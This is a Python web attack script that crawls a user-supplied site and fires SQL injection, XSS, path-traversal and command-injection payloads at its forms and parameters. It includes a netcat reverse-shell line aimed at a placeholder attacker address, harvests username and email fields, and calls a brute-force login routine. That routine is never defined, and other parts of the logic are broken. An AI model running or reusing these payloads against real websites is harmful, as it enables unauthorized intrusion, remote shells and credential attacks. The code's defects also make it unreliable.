import requests
from bs4 import BeautifulSoup
import re
import urllib.parse
import time
from selenium import webdriver
import os

def display_name():
    #name
    name_art = """
    \033[32m
    █████╗ ███████╗ █████╗ ██████╗ ██╗███╗   ██╗███████╗
    ██╔══██╗██╔════╝██╔══██╗██╔══██╗██║████╗  ██║██╔════╝
    ███████║███████╗███████║██████╔╝██║██╔██╗ ██║███████╗
    ██╔══██║╚════██║██╔══██║██╔══██╗██║██║╚██╗██║╚════██║
    ██║  ██║███████║██║  ██║██║  ██║██║██║ ╚████║███████║
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
    
    Developed by: asadinf\033[0m
    """
    tool_name = "\033[36mTool Name: web\033[0m"
    
    print(name_art)
    print(tool_name)

display_name()

def format_url(url):
    if not (url.startswith("http://") or url.startswith("https://")):
        url = "https://" + url
    if not (url.startswith("www.") or "://" in url):
        url = "www." + url
    return url

def save_to_file(filename, data):
    with open(filename, 'w') as file:
        for item in data:
            file.write(f"{item}\n")

def find_links(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        links = set()

        for a_tag in soup.find_all('a', href=True):
            link = urllib.parse.urljoin(url, a_tag['href'])
            if url in link:
                links.add(link)
        return links
    except Exception as e:
        print(f"Error fetching links from {url}: {e}")
        return set()

def sql_injection_test(url, params, payloads):
    vulnerable = False
    
    for payload in payloads:
        for param in params:
            test_params = params.copy()
            test_params[param] = payload
            
            response = requests.get(url, params=test_params)
            if "SQL" in response.text or "syntax" in response.text:
                print(f"Possible SQL Injection vulnerability found with payload: {payload} on param: {param}")
                vulnerable = True
                break

    if not vulnerable:
        print("No SQL Injection vulnerabilities found.")

def xss_test(url, params, payloads):
    vulnerable = False

    for payload in payloads:
        for param in params:
            test_params = params.copy()
            test_params[param] = payload

            response = requests.get(url, params=test_params)
            if payload in response.text:
                print(f"Possible XSS vulnerability found with payload: {payload} on param: {param}")
                vulnerable = True
                break

    if not vulnerable:
        print("No XSS vulnerabilities found.")

def analyze_headers(url):
    response = requests.get(url)
    headers = response.headers
    if 'X-Frame-Options' not in headers:
        print(f"X-Frame-Options header missing on {url}")
    if 'X-Content-Type-Options' not in headers:
        print(f"X-Content-Type-Options header missing on {url}")
    if 'Strict-Transport-Security' not in headers:
        print(f"Strict-Transport-Security header missing on {url}")

def form_analysis(url, sql_payloads, xss_payloads):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        urls = set()
        usernames = set()
        vulnerabilities = set()

        for form in soup.find_all('form'):
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            form_url = urllib.parse.urljoin(url, action)

            print(f"Form found on {form_url} with method {method.upper()}")

            form_data = {}
            for inp in inputs:
                name = inp.get('name')
                value = inp.get('value', 'test')
                if name:
                    form_data[name] = value

            sql_injection_test(form_url, form_data, sql_payloads)
            xss_test(form_url, form_data, xss_payloads)

            urls.add(form_url)
            for field in form_data.keys():
                if "email" in field.lower():
                    usernames.add(form_data[field])
                if "username" in field.lower():
                    usernames.add(form_data[field])

        return urls, usernames, vulnerabilities

    except Exception as e:
        print(f"Error analyzing forms on {url}: {e}")
        return set(), set(), set()

def parameter_fuzzing(url, params, payloads):
    vulnerable = False

    for payload in payloads:
        for param in params:
            test_params = params.copy()
            test_params[param] = payload

            response = requests.get(url, params=test_params)
            if payload in response.text:
                print(f"Parameter fuzzing found possible vulnerability with payload: {payload} on param: {param}")
                vulnerable = True

    if not vulnerable:
        print("No vulnerabilities found with parameter fuzzing.")

def rce_test(url, params, payloads):
    vulnerable = False

    for payload in payloads:
        for param in params:
            test_params = params.copy()
            test_params[param] = payload

            response = requests.get(url, params=test_params)
            if "RCE" in response.text:
                print(f"Possible RCE vulnerability found with payload: {payload} on param: {param}")
                vulnerable = True
                break

    if not vulnerable:
        print("No RCE vulnerabilities found.")

def deep_crawl_with_selenium(url):
    driver = webdriver.Firefox()
    driver.get(url)
    time.sleep(3)

    page_source = driver.page_source
    soup = BeautifulSoup(page_source, 'html.parser')

    links = set()
    for a_tag in soup.find_all('a', href=True):
        link = urllib.parse.urljoin(url, a_tag['href'])
        if url in link:
            links.add(link)
    
    driver.quit()
    return links

def scan_website(url, sql_payloads, xss_payloads, rce_payloads, fuzz_payloads, wordlist=None):
    formatted_url = format_url(url)
    base_domain = urllib.parse.urlparse(formatted_url).netloc.split('.')[0]
    
    all_urls = set()
    all_usernames = set()
    all_vulnerabilities = set()

    links = find_links(formatted_url)
    deep_links = deep_crawl_with_selenium(formatted_url)
    links.update(deep_links)

    for link in links:
        print(f"Scanning {link} ...")
        analyze_headers(link)
        urls, usernames, vulnerabilities = form_analysis(link, sql_payloads, xss_payloads)
        all_urls.update(urls)
        all_usernames.update(usernames)
        all_vulnerabilities.update(vulnerabilities)
        parameter_fuzzing(link, {}, fuzz_payloads)
        rce_test(link, {}, rce_payloads)
        time.sleep(1)

    save_to_file(f'{base_domain}_all_urls.txt', all_urls)
    save_to_file(f'{base_domain}_all_usernames_mail.txt', all_usernames)
    save_to_file(f'{base_domain}_vulnerabilities.txt', all_vulnerabilities)

    if wordlist:
        print("Starting brute force attack...")
        brute_force_login(formatted_url, 'username', 'password', wordlist)

def get_default_payloads():
    sql_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1' #"]
    xss_payloads = ["<script>alert('XSS')</script>", "'\"><img src=x onerror=alert(1)>", "<body onload=alert(1)>"]
    rce_payloads = ["'; echo RCE", "| nc -e /bin/sh attacker_ip attacker_port"]
    fuzz_payloads = ["../../../../etc/passwd", "' OR '1'='1", "<script>alert(1)</script>"]
    
    return sql_payloads, xss_payloads, rce_payloads, fuzz_payloads

if __name__ == "__main__":
    website_url = input("Enter the website URL (e.g., https://google.com): ")
    wordlist_path = input("Enter the path to the wordlist for brute force (leave blank to skip): ")

    sql_payloads_file = input("Enter path to SQL Injection payloads file (leave blank to use default): ")
    xss_payloads_file = input("Enter path to XSS payloads file (leave blank to use default): ")
    rce_payloads_file = input("Enter path to RCE payloads file (leave blank to use default): ")
    fuzz_payloads_file = input("Enter path to Fuzzing payloads file (leave blank to use default): ")

    if sql_payloads_file:
        with open(sql_payloads_file, 'r') as file:
            sql_payloads = [line.strip() for line in file]
    else:
        sql_payloads, xss_payloads, rce_payloads, fuzz_payloads = get_default_payloads()

    if xss_payloads_file:
        with open(xss_payloads_file, 'r') as file:
            xss_payloads = [line.strip() for line in file]
    else:
        if not 'xss_payloads' in locals():
            xss_payloads = get_default_payloads()[1]

    if rce_payloads_file:
        with open(rce_payloads_file, 'r') as file:
            rce_payloads = [line.strip() for line in file]
    else:
        if not 'rce_payloads' in locals():
            rce_payloads = get_default_payloads()[2]

    if fuzz_payloads_file:
        with open(fuzz_payloads_file, 'r') as file:
            fuzz_payloads = [line.strip() for line in file]
    else:
        if not 'fuzz_payloads' in locals():
            fuzz_payloads = get_default_payloads()[3]

    scan_website(website_url, sql_payloads, xss_payloads, rce_payloads, fuzz_payloads, wordlist_path)
